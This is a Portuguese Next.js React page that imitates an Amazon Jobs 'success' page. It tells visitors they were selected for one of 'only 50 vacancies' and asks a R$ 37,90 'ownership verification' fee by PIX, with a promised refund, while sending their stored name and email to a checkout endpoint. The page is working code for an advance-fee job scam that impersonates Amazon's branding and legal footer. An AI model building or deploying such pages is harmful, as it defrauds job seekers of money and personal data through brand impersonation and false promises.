"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import "./sucess.css";

interface Vaga {
  id: string;
  titulo: string;
  local: string;
  salario: string;
}

export default function Sucesso() {
  const [vaga, setVaga] = useState<Vaga | null>(null);
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  useEffect(() => {
    const vagaSalva = localStorage.getItem("vagaSelecionada");
    if (vagaSalva) {
      setVaga(JSON.parse(vagaSalva));
    }
  }, []);

 const handlePayment = async () => {
  if (!vaga) return;
  setLoading(true);

  try {
    const orderId = `${vaga.id}-${Date.now()}`;
const candidatoInfo = JSON.parse(localStorage.getItem("candidatoInfo") || "{}");

const r = await fetch("/api/checkout", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    amount: 3790, // R$ 37,90 em centavos
    orderId,
    description: `Verificação de titularidade para vaga ${vaga.titulo}`,
    payer: {
      name: candidatoInfo?.nome || "Cliente Teste",
      email: candidatoInfo?.email || "sememail@teste.com",
    },
  }),
});


    const data = await r.json();
    if (r.ok) {
      localStorage.setItem("pixCheckout", JSON.stringify(data));
      router.push("/payment"); // 👉 só redireciona
    } else {
      alert("Erro ao gerar cobrança PIX.");
    }
  } catch (err) {
    console.error("⛔ Erro no pagamento:", err);
    alert("Falha ao conectar com o gateway.");
  } finally {
    setLoading(false);
  }
};


  return (
    <main className="candidatura sucesso">
      <header>
        <div className="navbar">
          {/* LOGO */}
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>

          {/* LINKS CENTRALIZADOS */}
          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

      <section className="sucesso-box">
        <h1>Parabéns! Você conquistou uma vaga</h1>
        <p>
          Sua candidatura foi <b>aprovada com sucesso</b> e você foi
          selecionado(a) para fazer parte da nossa equipe em uma das{" "}
          <b>apenas 50 vagas que estavam disponíveis</b>.
        </p>

        {/* Detalhes da vaga */}
        <div className="sucesso-detalhes">
          <h2>Detalhes da vaga</h2>
          <ul>
            <li>
              <b>Função:</b> {vaga ? vaga.titulo : "Carregando..."}
            </li>
            <li>
              <b>Salário:</b> {vaga ? vaga.salario : "Carregando..."}
            </li>
            <li>
              <b>Benefícios:</b> Plano de saúde, vale-refeição e bônus de
              desempenho
            </li>
            <li>
              <b>Modelo de trabalho:</b>{" "}
              {vaga
                ? vaga.local.includes("Virtual") || vaga.local.includes("Remoto")
                  ? "100% remoto"
                  : "Presencial"
                : "Carregando..."}
            </li>
          </ul>
        </div>

        {/* Verificação de Titularidade */}
        <div className="sucesso-taxa">
          <h2>Verificação de Titularidade</h2>
          <p>
            Para protegermos seu cadastro e evitar tentativas de fraude, pedimos
            uma taxa única de <b>R$ 37,90</b> apenas para confirmar a
            titularidade do pagamento.
          </p>
          <p>
            É só um procedimento de verificação: após a conferência, o valor é
            estornado e você recebe o comprovante diretamente no e-mail
            cadastrado.
          </p>

          <button
            className="btn-pagar"
            onClick={handlePayment}
            disabled={loading}
          >
            {loading ? "Gerando PIX..." : "Realizar verificação agora"}
          </button>
        </div>
      </section>

      <footer className="footer">
        {/* Linha Social */}
        <div className="footer-social">
          <h4>Junte-se a nós agora</h4>
          <a href="#" aria-label="Facebook" className="social-link">
            <svg
              width="22"
              height="22"
              viewBox="0 0 448 512"
              fill="currentColor"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
                  37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
                  38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z" />
            </svg>
          </a>
        </div>

        {/* Linha Colunas */}
        <div className="footer-top">
          <div className="footer-col">
            <h4>OPORTUNIDADES DE EMPREGO</h4>
            <ul>
              <li>
                <a href="#">
                  Oportunidades em Centros de Distribuição e Estações de Entrega
                </a>
              </li>
              <li>
                <a href="#">Empregos de atendimento ao cliente</a>
              </li>
              <li>
                <a href="#">Procura de emprego</a>
              </li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>RECURSOS</h4>
            <ul>
              <li>
                <a href="#">Perguntas Frequentes</a>
              </li>
              <li>
                <a href="#">Fale Conosco</a>
              </li>
            </ul>
          </div>

          <div className="footer-logo">
            <Image
              src="/logo.92a0feec.svg"
              alt="Amazon Jobs"
              width={140}
              height={40}
            />
          </div>
        </div>

        {/* Linha inferior */}
        <div className="footer-bottom">
          <p className="descricao">
            A Amazon está comprometida com um ambiente de trabalho diversificado
            e inclusivo. A Amazon é uma empregadora que oferece oportunidades
            iguais e não discrimina com base em raça, nacionalidade, sexo,
            identidade de gênero, orientação sexual, deficiência, idade ou outro
            status legalmente protegido.
          </p>

          <div className="footer-legal">
            <a href="#">Aviso de privacidade</a>
            <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
          </div>
        </div>
      </footer>
    </main>
  );
}
